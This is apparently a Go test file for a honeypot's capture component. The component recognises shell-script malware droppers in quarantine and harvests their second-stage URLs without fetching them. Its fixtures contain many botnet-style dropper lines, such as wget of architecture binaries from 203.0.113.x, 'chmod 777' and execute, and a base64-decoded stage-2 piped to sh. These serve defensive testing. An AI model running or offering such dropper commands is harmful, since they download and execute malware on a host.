package capture

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/config"
	"github.com/networkshard/shardlure/internal/safefile"
	"github.com/networkshard/shardlure/internal/store"
)

func TestIsTextScript(t *testing.T) {
	tar := make([]byte, 512)
	copy(tar, "file.sh")
	copy(tar[257:], "ustar\x0000")
	binary := make([]byte, 200)
	for i := range binary {
		binary[i] = byte(1 + i%31) // control bytes, no NUL
	}
	cases := []struct {
		name string
		head []byte
		want bool
	}{
		{"elf", []byte("\x7fELF\x02\x01\x01 wget http://x/y"), false},
		{"pe", []byte("MZ this program cannot be run in DOS mode"), false},
		{"zip", []byte("PK\x03\x04 wget http://x/y"), false},
		{"gzip", []byte("\x1f\x8b\x08 wget"), false},
		{"bzip2", []byte("BZh91AY&SY"), false},
		{"xz", []byte("\xfd7zXZ\x00 wget"), false},
		{"7z", []byte("7z\xbc\xaf\x27\x1c wget"), false},
		{"tar", tar, false},
		{"nul", []byte("#!/bin/sh\nwget http://x/y\x00\n"), false},
		{"binary", binary, false},
		{"empty", nil, false},
		{"shebang dropper", []byte("#!/bin/sh\ncd /tmp; wget http://203.0.113.5/bins/x86\r\n\tchmod 777 *\n"), true},
		{"no shebang", []byte("cd /tmp || cd /var/run\nwget http://203.0.113.5/x; sh x\n"), true},
		{"utf8 comments", []byte("#!/bin/bash\n# загрузка — 下载器\nwget http://203.0.113.5/x\n"), true},
	}
	for _, c := range cases {
		if got := isTextScript(c.head); got != c.want {
			t.Errorf("%s: isTextScript=%v want %v", c.name, got, c.want)
		}
	}
}

func TestHarvestURLs(t *testing.T) {
	got := HarvestURLs("cd /tmp; wget http://203.0.113.5/bins/x86; wget http://203.0.113.5/bins/mips; chmod 777 *; ./x86", 32)
	if fmt.Sprint(got) != "[http://203.0.113.5/bins/x86 http://203.0.113.5/bins/mips]" {
		t.Fatalf("dropper: %v", got)
	}
	got = HarvestURLs("#!/bin/sh\necho d2dldCBodHRwOi8vMjAzLjAuMTEzLjkvc3RhZ2Uy|base64 -d|sh\n", 32)
	if fmt.Sprint(got) != "[http://203.0.113.9/stage2]" {
		t.Fatalf("base64 line: %v", got)
	}
	var b strings.Builder
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&b, "wget http://203.0.113.5/b/%d\n", i)
	}
	if got = HarvestURLs(b.String(), 32); len(got) != 32 || got[31] != "http://203.0.113.5/b/31" {
		t.Fatalf("40 URLs: %d %v", len(got), got)
	}
	got = HarvestURLs("wget http://203.0.113.5/a\ncurl -O http://203.0.113.5/a\nwget http://203.0.113.5/a", 32)
	if fmt.Sprint(got) != "[http://203.0.113.5/a]" {
		t.Fatalf("duplicates: %v", got)
	}
	long := "wget http://203.0.113.5/hidden " + strings.Repeat("A", 64<<10) + "\nwget http://203.0.113.5/kept\n"
	if got = HarvestURLs(long, 32); fmt.Sprint(got) != "[http://203.0.113.5/kept]" {
		t.Fatalf("over-long line: %v", got)
	}
	if got = HarvestURLs("cowrie-download:abc ftp://203.0.113.5/x", 32); len(got) != 0 {
		t.Fatalf("pseudo-key or non-http kept: %v", got)
	}
}

// Run harvests a fetched dropper under quarantine/ into pending child rows
// and never fetches them itself: the ArtifactWorker does that later.
func TestRunHarvestsScriptsAndOnlyEnqueues(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "harvest.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	cfg := config.Config{DataDir: t.TempDir()}
	cfg.Capture.Enabled = true
	cfg.Capture.QuarantineFetch = true
	cfg.Capture.HarvestScripts = true
	r := NewRunner(st, cfg)
	r.fetch.TestLoopback = true
	calls := 0
	r.fetch.Client = &http.Client{Transport: queueTransport(func(req *http.Request) (*http.Response, error) {
		calls++
		return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader("payload")), Header: make(http.Header)}, nil
	})}
	quarantine := filepath.Join(r.fetch.EvidenceDir, "quarantine")
	if err := os.MkdirAll(quarantine, 0o700); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	write := func(sha string, body []byte, url string) {
		t.Helper()
		p := filepath.Join(quarantine, sha)
		if body != nil {
			if err := os.WriteFile(p, body, 0o600); err != nil {
				t.Fatal(err)
			}
		}
		if err := st.RecordArtifact(store.Artifact{TS: now, SrcIP: "198.51.100.7", SessionID: "s1", URL: url, LocalPath: p,
			SHA256: sha, SizeBytes: 100, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
			t.Fatal(err)
		}
	}
	write(strings.Repeat("a", 64), []byte("#!/bin/sh\ncd /tmp; wget http://203.0.113.5/bins/x86; wget http://203.0.113.5/bins/mips; chmod 777 *; ./x86\n"), "http://203.0.113.5/bins.sh")
	write(strings.Repeat("b", 64), append([]byte("\x7fELF\x02\x01\x01"), []byte(" wget http://203.0.113.6/elf-string")...), "http://203.0.113.6/x")
	write(strings.Repeat("c", 64), nil, "http://203.0.113.7/gone.sh") // retention removed the file
	write(strings.Repeat("d", 64), []byte("wget http://203.0.113.8/after-gone\n"), "http://203.0.113.8/d.sh")

	if _, err := r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if calls != 0 {
		t.Fatalf("Run performed %d network requests", calls)
	}
	due, err := st.DueArtifactCaptures(time.Now(), 10, 5)
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(due)
	if fmt.Sprint(due) != "[http://203.0.113.5/bins/mips http://203.0.113.5/bins/x86 http://203.0.113.8/after-gone]" {
		t.Fatalf("queued children: %v", due)
	}
	// A second run harvests nothing new.
	if _, err := r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if again, _ := st.DueArtifactCaptures(time.Now(), 10, 5); len(again) != 3 {
		t.Fatalf("replay changed the queue: %v", again)
	}

	// Disabled: nothing is read.
	st2, err := store.Open(filepath.Join(t.TempDir(), "off.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st2.Close()
	cfg.Capture.HarvestScripts = false
	r2 := NewRunner(st2, cfg)
	p := filepath.Join(r2.fetch.EvidenceDir, "quarantine", strings.Repeat("e", 64))
	if err := os.WriteFile(p, bytes.Repeat([]byte("wget http://203.0.113.9/x\n"), 2), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := st2.RecordArtifact(store.Artifact{TS: now, URL: "http://203.0.113.9/s.sh", LocalPath: p, SHA256: strings.Repeat("e", 64),
		SizeBytes: 52, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
		t.Fatal(err)
	}
	if _, err := r2.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if due, _ := st2.DueArtifactCaptures(time.Now(), 10, 5); len(due) != 0 {
		t.Fatalf("harvest_scripts=false still queued %v", due)
	}
}

// harvestFixture is a capture runner with harvesting on, a network guard that
// fails the test on any request, and a helper recording a fetched payload.
type harvestFixture struct {
	t   *testing.T
	st  *store.Store
	r   *Runner
	dir string // evidence quarantine directory
}

func newHarvestFixture(t *testing.T, evidenceDir string) *harvestFixture {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "harvest.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	cfg := config.Config{DataDir: t.TempDir()}
	cfg.Capture.Enabled = true
	cfg.Capture.QuarantineFetch = true
	cfg.Capture.HarvestScripts = true
	cfg.Capture.EvidenceDir = evidenceDir
	r := NewRunner(st, cfg)
	r.fetch.Client = &http.Client{Transport: queueTransport(func(req *http.Request) (*http.Response, error) {
		t.Errorf("harvest performed a network request")
		return nil, fmt.Errorf("no network in tests")
	})}
	dir := filepath.Join(r.fetch.EvidenceDir, "quarantine")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	return &harvestFixture{t: t, st: st, r: r, dir: dir}
}

// add records a fetched payload at quarantine/<name> (written when body is
// non-nil) and returns its local path.
func (fx *harvestFixture) add(name string, body []byte, url string) string {
	fx.t.Helper()
	p := filepath.Join(fx.dir, name)
	if body != nil {
		if err := os.WriteFile(p, body, 0o600); err != nil {
			fx.t.Fatal(err)
		}
	}
	now := time.Now().UTC()
	if err := fx.st.RecordArtifact(store.Artifact{TS: now, URL: url, LocalPath: p, SHA256: strings.Repeat(name[:1], 64),
		SizeBytes: 100, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
		fx.t.Fatal(err)
	}
	return p
}

func (fx *harvestFixture) due() []string {
	fx.t.Helper()
	due, err := fx.st.DueArtifactCaptures(time.Now(), 50, 5)
	if err != nil {
		fx.t.Fatal(err)
	}
	sort.Strings(due)
	return due
}

func captureLog(t *testing.T) *bytes.Buffer {
	t.Helper()
	var buf bytes.Buffer
	old := log.Writer()
	log.SetOutput(&buf)
	t.Cleanup(func() { log.SetOutput(old) })
	return &buf
}

// I-1: an unreadable source is skipped and logged by id, sha prefix and a
// fixed category; the script after it is still harvested in the same Run.
func TestHarvestSkipsUnreadableSourceAndContinues(t *testing.T) {
	t.Run("injected permission error", func(t *testing.T) {
		fx := newHarvestFixture(t, "")
		bad := fx.add("a", []byte("wget http://203.0.113.1/never\n"), "http://203.0.113.1/a.sh")
		fx.add("b", []byte("wget http://203.0.113.2/next\n"), "http://203.0.113.2/b.sh")
		old := openHarvestFile
		openHarvestFile = func(root *safefile.Root, rel string) (*os.File, error) {
			if rel == filepath.Join("quarantine", "a") {
				return nil, safefile.ErrPermission
			}
			return old(root, rel)
		}
		t.Cleanup(func() { openHarvestFile = old })
		logs := captureLog(t)
		if _, err := fx.r.Run(context.Background()); err != nil {
			t.Fatal(err)
		}
		if got := fmt.Sprint(fx.due()); got != "[http://203.0.113.2/next]" {
			t.Fatalf("queued %s", got)
		}
		out := logs.String()
		if !strings.Contains(out, "harvest skipped artifact id=1 sha256="+strings.Repeat("a", 16)+": ErrPermission") {
			t.Fatalf("skip not logged by id/sha/category: %q", out)
		}
		if strings.Contains(out, bad) || strings.Contains(out, "203.0.113") {
			t.Fatalf("log leaked a path or URL: %q", out)
		}
		if fx.r.harvestErr != "" {
			t.Fatalf("a skipped source counted as a harvest failure: %q", fx.r.harvestErr)
		}
		// Settled: the next run neither re-reads nor re-logs it.
		logs.Reset()
		if _, err := fx.r.Run(context.Background()); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(logs.String(), "harvest skipped artifact") {
			t.Fatalf("skipped source re-read: %q", logs.String())
		}
	})
	t.Run("chmod 000", func(t *testing.T) {
		if os.Geteuid() == 0 {
			t.Skip("root reads mode-000 files")
		}
		fx := newHarvestFixture(t, "")
		p := fx.add("a", []byte("wget http://203.0.113.1/never\n"), "http://203.0.113.1/a.sh")
		if err := os.Chmod(p, 0); err != nil {
			t.Fatal(err)
		}
		fx.add("b", []byte("wget http://203.0.113.2/next\n"), "http://203.0.113.2/b.sh")
		if _, err := fx.r.Run(context.Background()); err != nil {
			t.Fatal(err)
		}
		if got := fmt.Sprint(fx.due()); got != "[http://203.0.113.2/next]" {
			t.Fatalf("queued %s", got)
		}
	})
	t.Run("symlink, hardlink, missing, directory", func(t *testing.T) {
		fx := newHarvestFixture(t, "")
		// All sources exist before the run: a queued child is an in-flight
		// capture and would hold later sources behind the horizon.
		target := fx.add("t", []byte("wget http://203.0.113.9/target\n"), "http://203.0.113.9/t.sh")
		if err := os.Symlink(target, filepath.Join(fx.dir, "s")); err != nil {
			t.Fatal(err)
		}
		fx.add("s", nil, "http://203.0.113.3/s.sh")
		// The hardlink's other name is unrecorded: linking the target would
		// make the target itself a refused two-link file.
		orig := filepath.Join(t.TempDir(), "orig")
		if err := os.WriteFile(orig, []byte("wget http://203.0.113.4/hard\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Link(orig, filepath.Join(fx.dir, "h")); err != nil {
			t.Fatal(err)
		}
		fx.add("h", nil, "http://203.0.113.4/h.sh")
		fx.add("m", nil, "http://203.0.113.5/m.sh")
		if err := os.Mkdir(filepath.Join(fx.dir, "d"), 0o700); err != nil {
			t.Fatal(err)
		}
		fx.add("d", nil, "http://203.0.113.6/d.sh")
		// A symlinked directory component (ErrUnsafePath).
		elsewhere := t.TempDir()
		if err := os.WriteFile(filepath.Join(elsewhere, "f"), []byte("wget http://203.0.113.8/via-link\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(elsewhere, filepath.Join(fx.dir, "l")); err != nil {
			t.Fatal(err)
		}
		fx.add(filepath.Join("l", "f"), nil, "http://203.0.113.8/l.sh")
		fx.add("z", []byte("wget http://203.0.113.7/last\n"), "http://203.0.113.7/z.sh")
		logs := captureLog(t)
		if _, err := fx.r.Run(context.Background()); err != nil {
			t.Fatal(err)
		}
		if got := fmt.Sprint(fx.due()); got != "[http://203.0.113.7/last http://203.0.113.9/target]" {
			t.Fatalf("queued %s", got)
		}
		out := logs.String()
		for _, cat := range []string{"ErrUnsafePath", "ErrNotRegular", "ErrNotExist"} {
			if !strings.Contains(out, ": "+cat) {
				t.Errorf("category %s not logged: %q", cat, out)
			}
		}
	})
}

// M-3: a relative evidence_dir records relative payload paths; they resolve
// against the same working directory as the root and are harvested.
func TestHarvestRelativeEvidenceDir(t *testing.T) {
	t.Chdir(t.TempDir())
	fx := newHarvestFixture(t, "evidence")
	p := fx.add("a", []byte("wget http://203.0.113.1/rel\n"), "http://203.0.113.1/a.sh")
	if filepath.IsAbs(p) {
		t.Fatalf("fixture path is absolute: %s", p)
	}
	if _, err := fx.r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if got := fmt.Sprint(fx.due()); got != "[http://203.0.113.1/rel]" {
		t.Fatalf("queued %s", got)
	}
}

// M-3: paths outside the evidence root are logged once per streak (fixed
// text, no path), and recovery once.
func TestHarvestOutsideRootLoggedOncePerStreak(t *testing.T) {
	fx := newHarvestFixture(t, "")
	logs := captureLog(t)
	now := time.Now().UTC()
	record := func(sha, url, path string) {
		if err := fx.st.RecordArtifact(store.Artifact{TS: now, URL: url, LocalPath: path, SHA256: sha,
			SizeBytes: 100, Origin: "quarantine_fetch", Status: "fetched", LastSuccessfulFetchAt: now}); err != nil {
			t.Fatal(err)
		}
	}
	outside := filepath.Join(t.TempDir(), "elsewhere")
	for i := 0; i < 2; i++ {
		record(fmt.Sprintf("%064d", i), fmt.Sprintf("http://203.0.113.1/%d", i), outside)
		if _, err := fx.r.Run(context.Background()); err != nil {
			t.Fatal(err)
		}
	}
	if n := strings.Count(logs.String(), "not under the evidence directory"); n != 1 {
		t.Fatalf("outside-root logged %d times: %q", n, logs.String())
	}
	if strings.Contains(logs.String(), outside) {
		t.Fatalf("log leaked the path: %q", logs.String())
	}
	fx.add("b", []byte("wget http://203.0.113.2/x\n"), "http://203.0.113.2/b.sh")
	if _, err := fx.r.Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(logs.String(), "map into the evidence directory again") {
		t.Fatalf("recovery not logged: %q", logs.String())
	}
}

// Run's harvest failures (store or evidence root, not a single source) are
// logged once per streak by fixed text, and recovery once.
func TestReportHarvestErrorStreaks(t *testing.T) {
	r := &Runner{}
	logs := captureLog(t)
	rootErr := &captureError{status: "failed", detail: "capture harvest root failed: ErrUnsafePath"}
	r.reportHarvestError(rootErr)
	r.reportHarvestError(rootErr)
	r.reportHarvestError(fmt.Errorf("database is locked at /secret/path"))
	r.reportHarvestError(nil)
	r.reportHarvestError(nil)
	out := logs.String()
	if n := strings.Count(out, "capture harvest root failed: ErrUnsafePath"); n != 1 {
		t.Fatalf("same failure logged %d times: %q", n, out)
	}
	if !strings.Contains(out, "second-stage harvest failed: capture harvest failed;") || strings.Contains(out, "/secret/path") {
		t.Fatalf("changed failure not logged by category: %q", out)
	}
	if n := strings.Count(out, "harvest recovered"); n != 1 {
		t.Fatalf("recovery logged %d times: %q", n, out)
	}
}

// An unopenable evidence root keeps the cursor (deployment state) and is
// reported through Run's streak log.
func TestHarvestRootFailureKeepsCursor(t *testing.T) {
	fx := newHarvestFixture(t, "")
	fx.add("a", []byte("wget http://203.0.113.1/later\n"), "http://203.0.113.1/a.sh")
	real := fx.r.fetch.EvidenceDir
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	fx.r.fetch.EvidenceDir = link // OpenRoot refuses a symlinked root
	if n, err := fx.r.harvestScripts(context.Background()); err == nil || n != 0 {
		t.Fatalf("symlinked root: n=%d err=%v", n, err)
	}
	fx.r.fetch.EvidenceDir = real
	if _, err := fx.r.harvestScripts(context.Background()); err != nil {
		t.Fatal(err)
	}
	if got := fmt.Sprint(fx.due()); got != "[http://203.0.113.1/later]" {
		t.Fatalf("source lost after a root failure: %s", got)
	}
}

// M-1: a line ending in tens of thousands of ')' is linear to trim.
func TestHarvestURLsTrailingBracketsLinear(t *testing.T) {
	line := "wget http://203.0.113.5/x" + strings.Repeat(")", 64<<10-40)
	start := time.Now()
	got := HarvestURLs(line+"\n", 32)
	// Linear: ~10 ms here; the old per-byte recount took ~80 ms on x86.
	if d := time.Since(start); d > 50*time.Millisecond {
		t.Fatalf("trailing-bracket line took %v", d)
	}
	if fmt.Sprint(got) != "[http://203.0.113.5/x]" {
		t.Fatalf("got %v", got)
	}
}

// M-2: URLs still holding shell expansion are not fetchable as written.
func TestHarvestURLsDropsShellExpansion(t *testing.T) {
	got := HarvestURLs("for a in x86 mips; do wget http://203.0.113.5/$a; done\nwget http://203.0.113.5/${b}.sh\nwget http://203.0.113.5/`uname -m`\nwget http://203.0.113.5/ok\n", 32)
	if fmt.Sprint(got) != "[http://203.0.113.5/ok]" {
		t.Fatalf("got %v", got)
	}
}

func TestIsTextScriptLineEndingsBOMAndEscapes(t *testing.T) {
	for name, head := range map[string][]byte{
		"crlf": []byte("#!/bin/sh\r\nwget http://203.0.113.5/x\r\n"),
		"bom":  []byte("\xef\xbb\xbf#!/bin/sh\nwget http://203.0.113.5/x\n"),
		"esc":  []byte("#!/bin/sh\necho -e '\x1b[31mred\x1b[0m'\nwget http://203.0.113.5/x\n"),
	} {
		if !isTextScript(head) {
			t.Errorf("%s: not a script", name)
		}
	}
}
